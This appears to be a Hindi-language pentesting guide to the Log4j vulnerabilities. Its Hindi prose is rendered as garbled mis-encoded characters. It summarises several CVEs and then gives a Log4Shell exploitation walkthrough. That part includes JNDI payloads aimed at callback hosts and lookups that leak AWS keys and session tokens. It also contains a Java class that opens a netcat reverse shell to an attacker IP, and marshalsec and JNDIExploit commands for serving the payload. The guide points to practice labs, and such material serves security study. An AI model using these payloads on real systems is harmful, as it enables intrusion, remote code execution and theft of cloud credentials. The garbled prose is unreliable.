рдпрд╣ рдХрдордЬреЛрд░рд┐рдпрд╛рдБ `log4j-core` рдШрдЯрдХ рдореЗрдВ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг **рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдЕрдиреБрдХреНрд░рдордг рджреЛрд╖** рд╣реИ, рдЬреЛ 2.0-beta9 рд╕реЗ 2.14.1 рддрдХ рдХреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддреА рд╣реИред рдпрд╣ **рджреВрд░рд╕реНрде рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди (RCE)** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред рдпрд╣ рдореБрджреНрджрд╛ рдЪреЗрди рдЭрд╛рдУрдЬреБрди рджреНрд╡рд╛рд░рд╛ рд░рд┐рдкреЛрд░реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдЬреЛ Alibaba Cloud Security Team рд╕реЗ рд╣реИрдВ рдФрд░ рдпрд╣ рд╡рд┐рднрд┐рдиреНрди Apache рдврд╛рдВрдЪреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИред рд╕рдВрд╕реНрдХрд░рдг 2.15.0 рдореЗрдВ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд╕реБрдзрд╛рд░ рдЕрдзреВрд░рд╛ рдерд╛ред рд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП Sigma рдирд┐рдпрдо рдЙрдкрд▓рдмреНрдз рд╣реИрдВ ([Rule 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [Rule 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml))ред

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **\[Critical]**

рд╢реБрд░реБрдЖрдд рдореЗрдВ рдХрдо рд░реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд▓реЗрдХрд┐рди рдмрд╛рдж рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рдЕрдкрдЧреНрд░реЗрдб рдХрд┐рдпрд╛ рдЧрдпрд╛, рдпрд╣ CVE рдПрдХ **Denial of Service (DoS)** рджреЛрд╖ рд╣реИ рдЬреЛ CVE-2021-44228 рдХреЗ рд▓рд┐рдП 2.15.0 рдореЗрдВ рдЕрдзреВрд░реЗ рд╕реБрдзрд╛рд░ рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк рд╣реИред рдпрд╣ рдЧреИрд░-рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рддреИрдпрд╛рд░ рдкреЗрд▓реЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ DoS рд╣рдорд▓реЗ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред рдПрдХ [рдЯреНрд╡реАрдЯ](https://twitter.com/marcioalm/status/1471740771581652995) рдПрдХ рдмрд╛рдпрдкрд╛рд╕ рд╡рд┐рдзрд┐ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдореБрджреНрджрд╛ рд╕рдВрд╕реНрдХрд░рдг 2.16.0 рдФрд░ 2.12.2 рдореЗрдВ рд╕рдВрджреЗрд╢ рд▓реБрдХрдЕрдк рдкреИрдЯрд░реНрди рдХреЛ рд╣рдЯрд╛рдХрд░ рдФрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ JNDI рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдХреЗ рд╣рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[High]**

рдпрд╣ **Log4j 1.x рд╕рдВрд╕реНрдХрд░рдгреЛрдВ** рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ `JMSAppender` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рдпрд╣ CVE рдПрдХ рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдЕрдиреБрдХреНрд░рдордг рджреЛрд╖ рд╣реИред 1.x рд╢рд╛рдЦрд╛ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рд╕реБрдзрд╛рд░ рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИ, рдЬреЛ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЪреБрдХреА рд╣реИ, рдФрд░ `log4j-core 2.17.0` рдореЗрдВ рдЕрдкрдЧреНрд░реЗрдб рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Moderate]**

рдпрд╣ рдХрдордЬреЛрд░рд┐рдпрд╛рдБ **Logback рд▓реЙрдЧрд┐рдВрдЧ рдврд╛рдВрдЪреЗ** рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддреА рд╣реИ, рдЬреЛ Log4j 1.x рдХрд╛ рдЙрддреНрддрд░рд╛рдзрд┐рдХрд╛рд░реА рд╣реИред рдкрд╣рд▓реЗ рдЗрд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдорд╛рдирд╛ рдЧрдпрд╛ рдерд╛, рд▓реЗрдХрд┐рди рдврд╛рдВрдЪреЗ рдХреЛ рдХрдордЬреЛрд░ рдкрд╛рдпрд╛ рдЧрдпрд╛, рдФрд░ рдирдП рд╕рдВрд╕реНрдХрд░рдг (1.3.0-alpha11 рдФрд░ 1.2.9) рдЬрд╛рд░реА рдХрд┐рдП рдЧрдП рд╣реИрдВ рддрд╛рдХрд┐ рдЗрд╕ рдореБрджреНрджреЗ рдХреЛ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

### **CVE-2021-45105** **\[High]**

Log4j 2.16.0 рдореЗрдВ рдПрдХ DoS рджреЛрд╖ рд╣реИ, рдЬрд┐рд╕рд╕реЗ CVE рдХреЛ рдареАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `log4j 2.17.0` рдЬрд╛рд░реА рдХрд┐рдпрд╛ рдЧрдпрд╛ред рдЖрдЧреЗ рдХреА рдЬрд╛рдирдХрд╛рд░реА BleepingComputer рдХреА [рд░рд┐рдкреЛрд░реНрдЯ](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/) рдореЗрдВ рд╣реИред

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)

рдпрд╣ log4j рд╕рдВрд╕реНрдХрд░рдг 2.17 рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЗрд╕ CVE рдХреЗ рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рдХреЛ log4j рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЗрд╕рдореЗрдВ рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП JDBCAppender рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рдордирдорд╛рдиреЗ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рд╢рд╛рдорд┐рд▓ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [Checkmarx рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/) рдореЗрдВ рдЙрдкрд▓рдмреНрдз рд╣реИред

## Log4Shell Exploitation

### Discovery

рдпрд╣ рдХрдордЬреЛрд░рд┐рдпрд╛рдБ рдмрд╣реБрдд рдЖрд╕рд╛рдиреА рд╕реЗ рдЦреЛрдЬреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рдпрджрд┐ рдпрд╣ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкрддреЗ рдкрд░ рдХрдо рд╕реЗ рдХрдо рдПрдХ **DNS рдЕрдиреБрд░реЛрдз** рднреЗрдЬреЗрдЧреАред рдЗрд╕рд▓рд┐рдП, рдкреЗрд▓реЛрдб рдЬреИрд╕реЗ:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (using [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (using [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (using Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (using [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` using (using [huntress](https://log4shell.huntress.com))

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдпрджрд┐ рдПрдХ DNS рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рдпрд╣ рдирд╣реАрдВ рд╣реИ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреБрд░реБрдкрдпреЛрдЧ рдпреЛрдЧреНрдп рд╣реИ** (рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдХрдордЬреЛрд░ рд╣реИ), рдЖрдкрдХреЛ рдЗрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

{% hint style="info" %}
рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ **рд╕рдВрд╕реНрдХрд░рдг 2.15** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **localhost рдЬрд╛рдВрдЪ рдмрд╛рдпрдкрд╛рд╕** рдЬреЛрдбрд╝рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **Local Discovery**

**рд╕реНрдерд╛рдиреАрдп рдХрдордЬреЛрд░ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Verification**

рдХреБрдЫ рдкреНрд▓реЗрдЯрдлрд╛рд░реНрдо рдЬреЛ рдкрд╣рд▓реЗ рд╕реВрдЪреАрдмрджреНрдз рдХрд┐рдП рдЧрдП рд╣реИрдВ, рдЖрдкрдХреЛ рдХреБрдЫ рд╡реЗрд░рд┐рдПрдмрд▓ рдбреЗрдЯрд╛ рдбрд╛рд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВрдЧреЗ рдЬреЛ рдЬрдм рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рддреЛ рд▓реЙрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред\
рдпрд╣ 2 рдЪреАрдЬреЛрдВ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:

* **рдХрдордЬреЛрд░реА** рдХреА **рдкреБрд╖реНрдЯрд┐** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП
* рдХрдордЬреЛрд░реА рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреЗ** рдХреЗ рд▓рд┐рдП

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:\
рдпрд╛ рдЬреИрд╕реЗ `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** рдФрд░ рдпрджрд┐ **env рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЗ рдорд╛рди рдХреЗ рд╕рд╛рде DNS рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ**, рддреЛ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрдордЬреЛрд░ рд╣реИред

рдЕрдиреНрдп рдЬрд╛рдирдХрд╛рд░реА рдЬрд┐рд╕реЗ рдЖрдк **рд▓реАрдХ** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE Information

{% hint style="info" %}
JDK рд╕рдВрд╕реНрдХрд░рдг 6u141, 7u131, рдпрд╛ 8u121 рд╕реЗ рдКрдкрд░ рдЪрд▓рдиреЗ рд╡рд╛рд▓реЗ рд╣реЛрд╕реНрдЯ LDAP рдХреНрд▓рд╛рд╕ рд▓реЛрдбрд┐рдВрдЧ рд╣рдорд▓реЗ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИрдВред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг `com.sun.jndi.ldap.object.trustURLCodebase` рдХрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдирд┐рд╖реНрдХреНрд░рд┐рдп рд╣реЛрдирд╛ рд╣реИ, рдЬреЛ JNDI рдХреЛ LDAP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рджреВрд░рд╕реНрде рдХреЛрдбрдмреЗрд╕ рд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрд╣ рдзреНрдпрд╛рди рд░рдЦрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдпреЗ рд╕рдВрд╕реНрдХрд░рдг **рдбрд┐рд╕реЗрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рд╣рдорд▓реЗ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реИрдВ**ред

рдЗрди рдЙрдЪреНрдЪ JDK рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ Java рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рднреАрддрд░ рдПрдХ **рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдЧреИрдЬреЗрдЯ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдЕрдХреНрд╕рд░ ysoserial рдпрд╛ JNDIExploit рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рд╡рд┐рдкрд░реАрдд, рдирд┐рдореНрди JDK рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛ рдЕрдкреЗрдХреНрд╖рд╛рдХреГрдд рдЖрд╕рд╛рди рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрди рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЛ рдордирд┐рдкреБрд▓реЗрдЯ рдХрд░рдХреЗ рдордирдорд╛рдиреЗ рдХреНрд▓рд╛рд╕ рд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП** (_рдЬреИрд╕реЗ RMI рдФрд░ CORBA рд╡реЗрдХреНрдЯрд░ рдкрд░ рд╕реАрдорд╛рдПрдБ_) **рдкрд┐рдЫрд▓реЗ JNDI рдирд╛рдордХрд░рдг рд╕рдВрджрд░реНрдн рдЕрдиреБрднрд╛рдЧ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ** рдпрд╛ [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec with custom payload

рдЖрдк рдЗрд╕реЗ **THM рдмреЙрдХреНрд╕** рдореЗрдВ рдкрд░реАрдХреНрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

рдЙрдкрдХрд░рдг [**marshalsec**](https://github.com/mbechler/marshalsec) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ (рдЬрд╛рд░ рд╕рдВрд╕реНрдХрд░рдг [**рдпрд╣рд╛рдБ**](https://github.com/RandomRobbieBF/marshalsec-jar) рдЙрдкрд▓рдмреНрдз рд╣реИ)ред рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдПрдХ LDAP рд╕рдВрджрд░реНрдн рд╕рд░реНрд╡рд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреЛ рдПрдХ рджреНрд╡рд┐рддреАрдпрдХ HTTP рд╕рд░реНрд╡рд░ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдЬрд╣рд╛рдБ рд╢реЛрд╖рдг рд╣реЛрд╕реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
рдЯрд╛рд░реНрдЧреЗрдЯ рдХреЛ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдХреЛрдб рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЗрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде `Exploit.java` рдирд╛рдордХ рдПрдХ рдЬрд╛рд╡рд╛ рдлрд╝рд╛рдЗрд▓ рддреИрдпрд╛рд░ рдХрд░реЗрдВ:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Java рдлрд╝рд╛рдЗрд▓ рдХреЛ рдХреНрд▓рд╛рд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдВрдХрд▓рд┐рдд рдХрд░реЗрдВ: `javac Exploit.java -source 8 -target 8`ред рдЗрд╕рдХреЗ рдмрд╛рдж, рдХреНрд▓рд╛рд╕ рдлрд╝рд╛рдЗрд▓ рд╡рд╛рд▓реЗ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдПрдХ **HTTP рд╕рд░реНрд╡рд░** рдкреНрд░рд╛рд░рдВрдн рдХрд░реЗрдВ: `python3 -m http.server`ред рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ **marshalsec LDAP рд╕рд░реНрд╡рд░** рдЗрд╕ HTTP рд╕рд░реНрд╡рд░ рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрддрд╛ рд╣реИред

рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдкрд░ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреНрд▓рд╛рд╕ рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ рдПрдХ рдкреЗрд▓реЛрдб рднреЗрдЬрдХрд░ рдЬреЛ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддрд╛ рд╣реИ:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**рдиреЛрдЯ:** рдпрд╣ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ Java рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдЬреЛ LDAP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд░рд┐рдореЛрдЯ рдХреЛрдбрдмреЗрд╕ рд▓реЛрдбрд┐рдВрдЧ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрджрд┐ рдпрд╣ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ, рддреЛ рдордирдорд╛рдиреЗ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреНрд▓рд╛рд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВред

### RCE - **JNDIExploit**

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ рд▓реЗрдЦрдХ рдиреЗ log4shell рдХреА рдЦреЛрдЬ рдХреЗ рдмрд╛рдж рдЗрд╕ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ github рд╕реЗ рд╣рдЯрд╛ рджрд┐рдпрд╛ред рдЖрдк [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) рдореЗрдВ рдПрдХ рдХреИрд╢реНрдб рд╕рдВрд╕реНрдХрд░рдг рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк рд▓реЗрдЦрдХ рдХреЗ рдирд┐рд░реНрдгрдп рдХрд╛ рд╕рдореНрдорд╛рди рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЗрд╕ vuln рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрд▓рдЧ рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЖрдк рд╡реЗрдмреИрдХ рдорд╢реАрди рдореЗрдВ рд╕реНрд░реЛрдд рдХреЛрдб рдирд╣реАрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╛ рддреЛ рд╕реНрд░реЛрдд рдХреЛрдб рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░реЗрдВ, рдпрд╛ рдпрд╣ рдЬрд╛рдирддреЗ рд╣реБрдП рдХрд┐ рдЖрдк рдХреНрдпрд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд░рд╣реЗ рд╣реИрдВ, jar рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВред
{% endhint %}

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк рдмрд╕ рдЗрд╕ **log4shell рдХреЗ рд▓рд┐рдП рдХрдордЬреЛрд░ рд╡реЗрдм рд╕рд░реНрд╡рд░** рдХреЛ рдкреЛрд░реНрдЯ 8080 рдкрд░ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_README рдореЗрдВ рдЖрдкрдХреЛ рдЗрд╕реЗ рдЪрд▓рд╛рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдорд┐рд▓реЗрдЧрд╛_)ред рдпрд╣ рдХрдордЬреЛрд░ рдРрдк log4shell рдХреЗ рдПрдХ рдХрдордЬреЛрд░ рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рд╕рд╛рде HTTP рдЕрдиреБрд░реЛрдз рд╣реЗрдбрд░ _X-Api-Version_ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рд▓реЙрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИред

рдлрд┐рд░, рдЖрдк **JNDIExploit** jar рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
